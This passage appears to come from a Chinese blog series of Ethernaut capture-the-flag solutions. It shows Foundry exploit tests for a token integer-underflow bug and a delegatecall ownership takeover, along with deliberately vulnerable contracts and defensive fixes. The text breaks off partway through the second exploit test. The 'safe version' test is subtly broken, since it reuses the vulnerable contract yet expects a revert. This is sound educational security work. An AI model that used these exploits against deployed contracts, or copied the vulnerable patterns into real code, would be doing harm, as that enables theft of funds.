href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»æµ‹è¯•ä»£ç \"><a href=\"#æ”»å‡»æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»æµ‹è¯•ä»£ç \"></a>æ”»å‡»æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// å¤åˆ¶åŸå§‹æœ‰æ¼æ´çš„åˆçº¦ (ä½¿ç”¨ 0.6.0 ç‰ˆæœ¬è¡Œä¸º)</span><br><span class=\"line\">contract VulnerableToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // æ•…æ„ä½¿ç”¨ä¸å®‰å…¨çš„ç®—æœ¯è¿ç®—</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">            balances[msg.sender] -= _value;</span><br><span class=\"line\">            balances[_to] += _value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TokenTest is Test &#123;</span><br><span class=\"line\">    VulnerableToken public token;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public victim = makeAddr(&quot;victim&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ä»£å¸åˆçº¦ï¼Œåˆå§‹ä¾›åº”é‡ 1000</span><br><span class=\"line\">        token = new VulnerableToken(1000);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™æ”»å‡»è€… 20 ä¸ªä»£å¸</span><br><span class=\"line\">        token.transfer(attacker, 20);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTokenUnderflowExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»å‰çŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;å—å®³è€…ä½™é¢:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ğŸ¯ å…³é”®æ”»å‡»ï¼šè½¬è´¦è¶…è¿‡ä½™é¢çš„ä»£å¸</span><br><span class=\"line\">        uint256 transferAmount = 21; // å¤§äº 20 çš„ä½™é¢</span><br><span class=\"line\">        token.transfer(victim, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»åçŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;å—å®³è€…ä½™é¢:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯ä¸‹æº¢æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertGt(token.balanceOf(attacker), 1000000); // æ”»å‡»è€…è·å¾—å·¨é¢ä»£å¸</span><br><span class=\"line\">        assertEq(token.balanceOf(victim), transferAmount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderflowMath() public view &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºä¸‹æº¢è®¡ç®—</span><br><span class=\"line\">        uint256 balance = 20;</span><br><span class=\"line\">        uint256 transferAmount = 21;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== ä¸‹æº¢è®¡ç®—æ¼”ç¤º ===&quot;);</span><br><span class=\"line\">        console.log(&quot;åŸå§‹ä½™é¢:&quot;, balance);</span><br><span class=\"line\">        console.log(&quot;è½¬è´¦é‡‘é¢:&quot;, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            uint256 result = balance - transferAmount;</span><br><span class=\"line\">            console.log(&quot;ä¸‹æº¢ç»“æœ:&quot;, result);</span><br><span class=\"line\">            console.log(&quot;æœ€å¤§ uint256:&quot;, type(uint256).max);</span><br><span class=\"line\">            console.log(&quot;æ˜¯å¦ç›¸ç­‰:&quot;, result == type(uint256).max);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testSafeVersion() public &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºå®‰å…¨ç‰ˆæœ¬</span><br><span class=\"line\">        VulnerableToken safeToken = new VulnerableToken(1000);</span><br><span class=\"line\">        safeToken.transfer(attacker, 20);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // åœ¨ Solidity 0.8.0+ ä¸­ï¼Œè¿™ä¼š revert</span><br><span class=\"line\">        vm.expectRevert(); // æœŸæœ›äº¤æ˜“å¤±è´¥</span><br><span class=\"line\">        safeToken.transfer(victim, 21); // è¿™åœ¨æ–°ç‰ˆæœ¬ä¸­ä¼šå¤±è´¥</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract TokenTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä½¿ç”¨-Solidity-0-8-0\"><a href=\"#1-ä½¿ç”¨-Solidity-0-8-0\" class=\"headerlink\" title=\"1. ä½¿ç”¨ Solidity 0.8.0+\"></a>1. ä½¿ç”¨ Solidity 0.8.0+</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        // Solidity 0.8.0+ è‡ªåŠ¨æ£€æŸ¥æº¢å‡º</span><br><span class=\"line\">        balances[msg.sender] -= _value; // è‡ªåŠ¨ revert å¦‚æœä¸‹æº¢</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-SafeMath-åº“-æ—§ç‰ˆæœ¬\"><a href=\"#2-ä½¿ç”¨-SafeMath-åº“-æ—§ç‰ˆæœ¬\" class=\"headerlink\" title=\"2. ä½¿ç”¨ SafeMath åº“ (æ—§ç‰ˆæœ¬)\"></a>2. ä½¿ç”¨ SafeMath åº“ (æ—§ç‰ˆæœ¬)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeTokenV6 &#123;</span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        balances[msg.sender] = balances[msg.sender].sub(_value); // å®‰å…¨å‡æ³•</span><br><span class=\"line\">        balances[_to] = balances[_to].add(_value); // å®‰å…¨åŠ æ³•</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ˜¾å¼æ£€æŸ¥\"><a href=\"#3-æ˜¾å¼æ£€æŸ¥\" class=\"headerlink\" title=\"3. æ˜¾å¼æ£€æŸ¥\"></a>3. æ˜¾å¼æ£€æŸ¥</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ExplicitCheckToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"æ•´æ•°æº¢å‡ºç±»å‹\"><a href=\"#æ•´æ•°æº¢å‡ºç±»å‹\" class=\"headerlink\" title=\"æ•´æ•°æº¢å‡ºç±»å‹\"></a>æ•´æ•°æº¢å‡ºç±»å‹</h3><table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>æè¿°</th>\n<th>ç¤ºä¾‹</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>ä¸Šæº¢</strong></td>\n<td>è¶…è¿‡æœ€å¤§å€¼</td>\n<td><code>type(uint256).max + 1 = 0</code></td>\n</tr>\n<tr>\n<td><strong>ä¸‹æº¢</strong></td>\n<td>ä½äºæœ€å°å€¼</td>\n<td><code>0 - 1 = type(uint256).max</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"Solidity-ç‰ˆæœ¬å¯¹æ¯”\"><a href=\"#Solidity-ç‰ˆæœ¬å¯¹æ¯”\" class=\"headerlink\" title=\"Solidity ç‰ˆæœ¬å¯¹æ¯”\"></a>Solidity ç‰ˆæœ¬å¯¹æ¯”</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Solidity 0.7.x åŠä»¥ä¸‹</span><br><span class=\"line\">function unsafeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // å¯èƒ½æº¢å‡ºï¼Œæ— è‡ªåŠ¨æ£€æŸ¥</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Solidity 0.8.0+</span><br><span class=\"line\">function safeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // è‡ªåŠ¨æ£€æŸ¥æº¢å‡ºï¼Œæº¢å‡ºæ—¶ revert</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ˜¾å¼ä¸å®‰å…¨æ“ä½œ (0.8.0+)</span><br><span class=\"line\">function explicitUnsafe(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    unchecked &#123;</span><br><span class=\"line\">        return a + b; // æ˜¾å¼è·³è¿‡æº¢å‡ºæ£€æŸ¥</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰å…¨æ•°å­¦è¿ç®—\"><a href=\"#å®‰å…¨æ•°å­¦è¿ç®—\" class=\"headerlink\" title=\"å®‰å…¨æ•°å­¦è¿ç®—\"></a>å®‰å…¨æ•°å­¦è¿ç®—</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âœ… å®‰å…¨çš„ä½™é¢æ£€æŸ¥</span><br><span class=\"line\">function safeTransfer(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _value;</span><br><span class=\"line\">    balances[_to] += _value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… ä½¿ç”¨ SafeMath (æ—§ç‰ˆæœ¬)</span><br><span class=\"line\">function safeTransferLegacy(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class=\"line\">    balances[_to] = balances[_to].add(_value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å†å²æ¡ˆä¾‹\"><a href=\"#ğŸ›ï¸-å†å²æ¡ˆä¾‹\" class=\"headerlink\" title=\"ğŸ›ï¸ å†å²æ¡ˆä¾‹\"></a>ğŸ›ï¸ å†å²æ¡ˆä¾‹</h2><h3 id=\"è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\"><a href=\"#è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\" class=\"headerlink\" title=\"è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\"></a>è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»</h3><ol>\n<li><p><strong>PoWHCoin</strong> (2018)</p>\n<ul>\n<li>æ”»å‡»è€…åˆ©ç”¨æ•´æ•°æº¢å‡ºè·å¾—å·¨é¢ä»£å¸</li>\n<li>å¯¼è‡´é¡¹ç›®å®Œå…¨å´©æºƒ</li>\n</ul>\n</li>\n<li><p><strong>BeautyChain (BEC)</strong> (2018)</p>\n<ul>\n<li>BatchOverFlow æ¼æ´</li>\n<li>é€ æˆä»£å¸ä»·å€¼å½’é›¶</li>\n</ul>\n</li>\n<li><p><strong>SMT Token</strong> (2018)</p>\n<ul>\n<li>ç±»ä¼¼çš„æ‰¹é‡è½¬è´¦æº¢å‡ºæ¼æ´</li>\n<li>äº¤æ˜“æ‰€æš‚åœäº¤æ˜“</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Token å…³å¡æ­ç¤ºäº†æ—©æœŸ Solidity çš„é‡è¦å®‰å…¨éšæ‚£ï¼š</p>\n<ul>\n<li>âœ… <strong>æ•´æ•°æº¢å‡ºçš„ä¸¥é‡åæœ</strong> - å¯ä»¥å®Œå…¨ç ´åä»£å¸ç»æµå­¦</li>\n<li>âœ… <strong>ç‰ˆæœ¬å‡çº§çš„é‡è¦æ€§</strong> - Solidity 0.8.0+ æä¾›å†…ç½®ä¿æŠ¤</li>\n<li>âœ… <strong>SafeMath çš„å†å²ä»·å€¼</strong> - åœ¨æ—§ç‰ˆæœ¬ä¸­æä¾›å®‰å…¨ä¿æŠ¤</li>\n<li>âœ… <strong>æ˜¾å¼æ£€æŸ¥çš„å¿…è¦æ€§</strong> - æ€»æ˜¯éªŒè¯å…³é”®å‡è®¾</li>\n</ul>\n<p>è¿™ä¸ªçœ‹ä¼¼ç®€å•çš„ç®—æœ¯é”™è¯¯ï¼Œå®é™…ä¸Šå½±å“äº†æ— æ•° DeFi é¡¹ç›®çš„å®‰å…¨æ€§è®¾è®¡ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">ä¸Šä¸€å…³: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">ä¸‹ä¸€å…³: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/2.x/api/math\">OpenZeppelin SafeMath</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»","date":"2025-01-25T06:50:00.000Z","updated":"2025-01-25T06:50:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥ç†è§£ delegatecall çš„å·¥ä½œåŸç†å’Œå®‰å…¨é£é™©ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨å­˜å‚¨æ§½å¸ƒå±€å·®å¼‚è¿›è¡Œæ”»å‡»ï¼ŒæŒæ¡ä»£ç†æ¨¡å¼çš„å®‰å…¨è€ƒé‡ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 6 - Delegation](https://ethernaut.openzeppelin.com/level/6)  \n> **æ”»å‡»ç±»å‹**: delegatecall å­˜å‚¨æ§½æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â­â˜†  \n> **æ ¸å¿ƒæ¦‚å¿µ**: å­˜å‚¨ä¸Šä¸‹æ–‡åˆ‡æ¢ã€ä»£ç†æ¨¡å¼å®‰å…¨\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™ä¸ªå…³å¡è€ƒéªŒå¯¹ `delegatecall` æœºåˆ¶çš„æ·±å…¥ç†è§£ï¼š\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸º `Delegation` åˆçº¦çš„ `owner`\n2. **ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢** - æŒæ¡ `delegatecall` çš„å­˜å‚¨æœºåˆ¶\n3. **å­¦ä¹ ä»£ç†æ¨¡å¼é£é™©** - äº†è§£å‡çº§æ¨¡å¼çš„å®‰å…¨éšæ‚£\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Delegate {\n    address public owner;\n\n    constructor(address _owner) {\n        owner = _owner;\n    }\n\n    function pwn() public {\n        owner = msg.sender;  // ğŸ¯ ç›®æ ‡å‡½æ•°ï¼šä¼šä¿®æ”¹ owner\n    }\n}\n\ncontract Delegation {\n    address public owner;      // ğŸš¨ å­˜å‚¨æ§½ 0\n    Delegate delegate;         // ğŸš¨ å­˜å‚¨æ§½ 1\n\n    constructor(address _delegateAddress) {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n\n    fallback() external {\n        // ğŸš¨ å±é™©çš„ delegatecall\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n```\n\n### æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall vs call\n\n| è°ƒç”¨æ–¹å¼ | æ‰§è¡Œä¸Šä¸‹æ–‡ | å­˜å‚¨ä¿®æ”¹ | msg.sender | ä½¿ç”¨åœºæ™¯ |\n|----------|------------|----------|------------|----------|\n| **call** | è¢«è°ƒç”¨åˆçº¦ | è¢«è°ƒç”¨åˆçº¦ | è°ƒç”¨åˆçº¦åœ°å€ | æ™®é€šå¤–éƒ¨è°ƒç”¨ |\n| **delegatecall** | è°ƒç”¨åˆçº¦ | è°ƒç”¨åˆçº¦ | åŸå§‹è°ƒç”¨è€… | ä»£ç†æ¨¡å¼ã€å‡çº§ |\n\n### æ¼æ´åŸç†\n\n**delegatecall çš„å·¥ä½œæœºåˆ¶**ï¼š\n- æ‰§è¡Œ**è¢«è°ƒç”¨åˆçº¦çš„ä»£ç **\n- ä½¿ç”¨**è°ƒç”¨åˆçº¦çš„å­˜å‚¨**\n- ä¿æŒ**åŸå§‹çš„ msg.sender**\n\n```solidity\n// å½“ Delegation åˆçº¦æ‰§è¡Œ delegatecall æ—¶ï¼š\ndelegate.delegatecall(abi.encodeWithSignature(\"pwn()\"));\n\n// å®é™…æ‰§è¡Œï¼š\n// 1. è¿è¡Œ Delegate.pwn() çš„ä»£ç \n// 2. ä½†æ˜¯åœ¨ Delegation åˆçº¦çš„å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­\n// 3. owner = msg.sender; ä¿®æ”¹çš„æ˜¯ Delegation.owner (å­˜å‚¨æ§½0)\n```\n\n### å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\n\n```solidity\n// Delegate åˆçº¦å­˜å‚¨å¸ƒå±€\n// æ§½ 0: address owner\n\n// Delegation åˆçº¦å­˜å‚¨å¸ƒå±€  \n// æ§½ 0: address owner     â† è¿™ä¸ªä¼šè¢« delegatecall ä¿®æ”¹ï¼\n// æ§½ 1: Delegate delegate\n```\n\n### æ”»å‡»è·¯å¾„\n\n1. **æ„é€ å‡½æ•°è°ƒç”¨æ•°æ®** - ç¼–ç  `pwn()` å‡½æ•°é€‰æ‹©å™¨\n2. **è§¦å‘ fallback å‡½æ•°** - å‘åˆçº¦å‘é€å¸¦æ•°æ®çš„äº¤æ˜“\n3. **æ‰§è¡Œ delegatecall** - åœ¨ Delegation å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ `pwn()`\n4. **è·å¾—æ§åˆ¶æƒ** - `owner` è¢«è®¾ç½®ä¸ºæ”»å‡»è€…åœ°å€\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Delegation.sol\";\n\ncontract DelegationTest is Test {\n    Delegate public delegate;\n    Delegation public delegation;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public deployer = makeAddr(\"deployer\");\n\n    function setUp() public {\n        vm.startPrank(deployer);\n        \n        // éƒ¨ç½² Delegate åˆçº¦\n        delegate = new Delegate(deployer);\n        \n        // éƒ¨ç½² Delegation åˆçº¦\n        delegation = new Delegation(address(delegate));\n        \n        vm.stopPrank();\n    }\n\n    function testDelegationExploit() public {\n        console.log(\"Initial owner:\", delegation.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        vm.startPrank(attacker);\n        \n        // ğŸ¯ å…³é”®æ”»å‡»ï¼šæ„é€  pwn() å‡½æ•°è°ƒç”¨\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        \n        // é€šè¿‡ fallback å‡½æ•°è§¦å‘ delegatecall\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Attack failed\");\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(delegation.owner(), attacker);\n        console.log(\"New owner:\", delegation.owner());\n        console.log(\"Attack successful!\");\n    }\n    \n    function testUnderstandDelegatecall() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"=== Before Attack ===\");\n        console.log(\"Delegation owner:\", delegation.owner());\n        console.log(\"Delegate owner:\", delegate.owner());\n        \n        // ç›´æ¥è°ƒç”¨ delegate.pwn() åªä¼šä¿®æ”¹ delegate 